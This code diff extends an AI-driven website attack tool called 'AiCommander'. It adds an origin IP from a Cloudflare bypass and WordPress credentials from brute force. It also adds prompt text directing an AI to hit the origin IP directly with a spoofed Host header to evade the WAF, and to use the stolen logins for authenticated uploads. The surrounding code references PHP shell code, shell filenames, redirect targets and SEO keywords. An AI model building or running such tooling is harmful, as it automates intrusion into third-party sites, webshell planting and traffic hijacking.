@@ -124,6 +124,17 @@ export interface AiCommanderConfig {
   phpShellCode?: string;
   // v3: Shell filename for non-WP exploits
   shellFileName?: string;
+  // v4: Origin IP from CF bypass (bypass WAF by targeting directly)
+  originIP?: string;
+  // v4: WP credentials from brute force
+  wpCredentials?: {
+    username: string;
+    password: string;
+    method: string;
+    cookies?: string;
+    nonce?: string;
+    authHeader?: string;
+  } | null;
 }
 
 export interface AiCommanderResult {
@@ -750,6 +761,8 @@ ${nonWpData}
 
 REDIRECT TARGET: ${redirectUrl}
 SEO KEYWORDS: ${seoKeywords.length > 0 ? seoKeywords.join(", ") : "none"}
+${recon.ip && recon.waf ? `\nORIGIN IP BYPASS: Target IP ${recon.ip} — use http://${recon.ip} with Host header "${recon.domain}" to bypass ${recon.waf} WAF. All requests should target this IP directly.` : ""}
+${recon.exposedEndpoints.some(e => e.includes("auth:")) ? `\nWP CREDENTIALS AVAILABLE: ${recon.exposedEndpoints.filter(e => e.includes("auth:")).join(", ")} — Use these credentials for authenticated uploads via REST API (X-WP-Nonce + Cookie) or XMLRPC.` : ""}
 
 ITERATION: ${iteration}/${maxIterations}
 
@@ -1510,6 +1523,8 @@ export async function runAiCommander(config: AiCommanderConfig): Promise<AiComma
     userId,
     pipelineType = "manual",
     sessionId = randomStr(16),
+    originIP = null,
+    wpCredentials = null,
   } = config;
 
   const startTime = Date.now();
@@ -1529,6 +1544,25 @@ export async function runAiCommander(config: AiCommanderConfig): Promise<AiComma
   try {
     // Do recon first to get server info for history query
     reconData = await performRecon(targetDomain, preAnalysis, onEvent);
+    
+    // v4: Inject origin IP from CF bypass into recon
+    if (originIP) {
+      reconData.ip = originIP;
+      onEvent?.({
+        type: "recon", iteration: 0, maxIterations,
+        detail: `☁️ Using CF Bypass Origin IP: ${originIP} (bypassing WAF)`,
+      });
+    }
+    
+    // v4: Inject WP credentials into recon context
+    if (wpCredentials) {
+      reconData.exposedEndpoints.push(`wp-admin (auth: ${wpCredentials.username})`);
+      onEvent?.({
+        type: "recon", iteration: 0, maxIterations,
+        detail: `🔑 WP Credentials available: ${wpCredentials.username} via ${wpCredentials.method}`,
+      });
+    }
+    
     historyInsights = await loadHistoryInsights(reconData, onEvent);
   } catch (e: any) {
     onEvent?.({
